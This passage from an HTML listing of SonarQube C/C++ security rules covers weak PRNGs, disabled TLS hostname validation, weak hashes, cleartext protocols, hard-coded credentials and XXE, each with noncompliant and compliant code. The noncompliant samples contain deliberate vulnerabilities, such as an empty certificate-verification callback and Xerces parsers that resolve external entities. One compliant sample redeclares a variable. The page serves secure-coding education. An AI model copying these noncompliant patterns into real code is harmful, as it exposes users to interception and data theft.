  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" rel="nofollow">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths* <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption
  Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S2245">
              c:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2013-6386" rel="nofollow">CVE-2013-6386</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-3419" rel="nofollow">CVE-2006-3419</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2008-4102" rel="nofollow">CVE-2008-4102</a> </li></ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the functions rely on a pseudorandom number generator, they should not be used for security-critical applications or for protecting sensitive
data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li><li> the function you use generates a value which can be predicted (pseudo-random). </li><li> the generated value is used multiple times. </li><li> an attacker can access the generated value. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use functions which rely on a strong random number generator such as <code>randombytes_uniform()</code> or <code>randombytes_buf()</code> from
  <code>libsodium</code>, or <code>randomize()</code> from Botan. </li><li> Use the generated random values only once. </li><li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;random&gt;
// ...

void f() {
  int random_int &#61; std::rand(); // Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;sodium.h&gt;
#include &lt;botan/system_rng.h&gt;
// ...

void f() {
  char random_chars[10];
  randombytes_buf(random_chars, 10); // Compliant
  uint32_t random_int &#61; randombytes_uniform(10); // Compliant

  uint8_t random_chars[10];
  Botan::System_RNG system;
  system.randomize(random_chars, 10); // Compliant
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/338" rel="nofollow">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
  </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/1241" rel="nofollow">MITRE, CWE-1241</a> - Use of Predictable Algorithm in Random Number Generator </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/oTdGBQ" rel="nofollow">CERT, MSC02-J.</a> - Generate strong random numbers </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/UNcxBQ" rel="nofollow">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/2ns-BQ" rel="nofollow">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM" rel="nofollow">Predictable Pseudo Random Number
  Generator</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5527">
              c:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to
use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks
{
    virtual void tls_verify_cert_chain(
              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,
              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,
              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,
              Botan::Usage_Type usage,
              const std::string &amp;hostname,
              const Botan::TLS::Policy &amp;policy)
    override  { }
};

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information(&#34;example.com&#34;, 443),
                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks { };

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information(&#34;example.com&#34;, 443),
                              Botan::TLS::Protocol_Version::TLS_V12);
}
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul><li> Create a self-signed certificate for that machine. </li><li> Add this self-signed certificate to the system’s trust store. </li><li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li></ul>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://botan.randombit.net/handbook/" rel="nofollow">Botan</a> - Handbook </li><li> <a href="https://www.feistyduck.com/books/openssl-cookbook/" rel="nofollow">OpenSSL</a> - Cookbook </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/297" rel="nofollow">MITRE, CWE-297</a> - Improper Validation of Certificate with Host Mismatch </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S4790">
              c:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;botan/hash.h&gt;
// ...

Botan::secure_vector&lt;uint8_t&gt; f(std::string input){
    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create(&#34;MD5&#34;)); // Sensitive
    return hash-&gt;process(input);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;botan/hash.h&gt;
// ...

Botan::secure_vector&lt;uint8_t&gt; f(std::string input){
    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create(&#34;SHA-512&#34;)); // Compliant
    return hash-&gt;process(input);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5332">
              c:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
char* http_url &#61; &#34;http://example.com&#34;; // Sensitive
char* ftp_url &#61; &#34;ftp://anonymous&#64;example.com&#34;; // Sensitive
char* telnet_url &#61; &#34;telnet://anonymous&#64;example.com&#34;; // Sensitive
</pre>
<pre>
#include &lt;curl/curl.h&gt;

CURL *curl_ftp &#61; curl_easy_init();
curl_easy_setopt(curl_ftp, CURLOPT_URL, &#34;ftp://example.com/&#34;); // Sensitive

CURL *curl_smtp &#61; curl_easy_init();
curl_easy_setopt(curl_smtp, CURLOPT_URL, &#34;smtp://example.com:587&#34;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
char* https_url &#61; &#34;https://example.com&#34;;
char* sftp_url &#61; &#34;sftp://anonymous&#64;example.com&#34;;
char* ssh_url &#61; &#34;ssh://anonymous&#64;example.com&#34;;
</pre>
<pre>
#include &lt;curl/curl.h&gt;

CURL *curl_ftps &#61; curl_easy_init();
curl_easy_setopt(curl_ftps, CURLOPT_URL, &#34;ftp://example.com/&#34;);
curl_easy_setopt(curl_ftps, CURLOPT_USE_SSL, CURLUSESSL_ALL); // FTP transport is done over TLS

CURL *curl_smtp_tls &#61; curl_easy_init();
curl_easy_setopt(curl_smtp_tls, CURLOPT_URL, &#34;smtp://example.com:587&#34;);
curl_easy_setopt(curl_smtp_tls, CURLOPT_USE_SSL, CURLUSESSL_ALL); // SMTP with STARTTLS
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S2068">
              c:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule looks for hard-coded credentials in variable names that match any of the patterns from the provided list.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
dbi_conn conn &#61; dbi_conn_new(&#34;mysql&#34;);
string password &#61; &#34;secret&#34;; // Sensitive
dbi_conn_set_option(conn, &#34;password&#34;, password.c_str());
</pre>
<h2>Compliant Solution</h2>
<pre>
dbi_conn conn &#61; dbi_conn_new(&#34;mysql&#34;);
string password &#61; getDatabasePassword(); // Compliant
dbi_conn_set_option(conn, &#34;password&#34;, password.c_str()); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ" rel="nofollow">CERT, MSC03-J.</a> - Never hard code sensitive information </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S2755">
              c:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in Xerces</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
#include &#34;xercesc/parsers/XercesDOMParser.hpp&#34;

void parse() {
  XercesDOMParser *DOMparser &#61; new XercesDOMParser();
  DOMparser-&gt;setCreateEntityReferenceNodes(false); // Noncompliant
  DOMparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant

  DOMparser-&gt;parse(xmlFile);
}
</pre>
<p>By default, entities resolution is enabled for <code>XMLReaderFactory::createXMLReader</code>.</p>
<pre data-diff-id="12" data-diff-type="noncompliant">
#include &#34;xercesc/sax2/SAX2XMLReader.hpp&#34;

void parse() {
  SAX2XMLReader* reader &#61; XMLReaderFactory::createXMLReader();
  reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, false); // Noncompliant

  reader-&gt;parse(xmlFile);
}
</pre>
<p>By default, entities resolution is enabled for <code>SAXParser</code>.</p>
<pre data-diff-id="13" data-diff-type="noncompliant">
#include &#34;xercesc/parsers/SAXParser.hpp&#34;

void parse() {
  SAXParser* SAXparser &#61; new SAXParser();
  SAXparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant

  SAXparser-&gt;parse(xmlFile);
}
</pre>
<h4>Compliant solution</h4>
<p>By default, <code>XercesDOMParser</code> is safe.</p>
<pre data-diff-id="11" data-diff-type="compliant">
#include &#34;xercesc/parsers/XercesDOMParser.hpp&#34;

void parse() {
  XercesDOMParser *DOMparser &#61; new XercesDOMParser();
  DOMparser-&gt;setCreateEntityReferenceNodes(true);
  DOMparser-&gt;setDisableDefaultEntityResolution(true);

  DOMparser-&gt;parse(xmlFile);
}
</pre>
<pre data-diff-id="12" data-diff-type="compliant">
#include &#34;xercesc/sax2/SAX2XMLReader.hpp&#34;

void parse() {
  SAX2XMLReader* reader &#61; XMLReaderFactory::createXMLReader();
  reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, true);

  reader-&gt;parse(xmlFile);
}
</pre>
<pre data-diff-id="13" data-diff-type="compliant">
#include &#34;xercesc/parsers/SAXParser.hpp&#34;

void parse() {
  SAXParser* SAXparser &#61; new SAXParser();
  SAXparser-&gt;setDisableDefaultEntityResolution(true);

  SAXparser-&gt;parse(xmlFile);
}
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br /> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_%28XXE%29" rel="nofollow">OWASP Top 10 2017 Category A4</a> - XML External
  Entities (XXE) </li><li> <a href="https://cwe.mitre.org/data/definitions/611" rel="nofollow">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li><li> <a href="https://cwe.mitre.org/data/definitions/827" rel="nofollow">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5798">
              c:S5798
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
